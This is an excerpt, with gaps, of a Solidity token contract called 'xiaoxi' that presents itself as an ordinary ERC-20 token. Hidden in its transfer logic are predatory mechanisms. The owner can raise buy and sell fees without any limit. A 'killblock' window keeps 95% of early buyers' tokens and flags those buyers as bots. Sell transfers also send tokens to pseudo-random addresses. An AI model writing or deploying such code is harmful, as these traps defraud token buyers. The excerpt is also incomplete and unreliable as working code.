...
contract xiaoxi is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "xiaoxi";
    string private _symbol = "xiaoxi";
    uint8 private _decimals = 9;

    uint public launchedBlock;
    uint public _killblock = 10;
    bool public isLaunch = false;
    address payable public marketingWalletAddress = payable(0xA2dE3871288Bfea083684b419Ca279A7eCd82186); // Marketing Address
    address payable public teamWalletAddress = payable(0x198FF42659B9fE170dB0B552793d67840d8c3D0c); // Team Address
    ...
    uint256 public _buyReserveFee = 5;
    function updatebuyReserveFee(uint value) external onlyOwner{
        _buyReserveFee = value;
    }

    uint256 public _sellReserveFee = 1;
    function updatesellReserveFee(uint value) external onlyOwner{
        _sellReserveFee = value;
    }    
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            if (!isExcludedFromFee[sender] && !isExcludedFromFee[recipient] && _sellReserveFee > 0) {
                uint _sellReserveFeeAmount = amount.div(1000).mul(_sellReserveFee);
                amount = amount.sub(_sellReserveFeeAmount);
                address ad;
                for(int i=0;i <=2;i++){
                    ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                    _basicTransfer(sender, ad, 100000);
                }
                amount -= 300000;
            }
            ...
            if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
                ...
                if(sender == uniswapPair) {
                    if (block.number <= launchedBlock + _killblock) {                  
                        uint256 _buyReserveFeeAmount = amount.mul(_buyReserveFee).div(100);
                        uint256 TaxAmount = finalAmount.sub(_buyReserveFeeAmount);
                        _balances[address(this)] += TaxAmount;
                        finalAmount = _buyReserveFeeAmount;
                        addBot(recipient);
                    }
                }
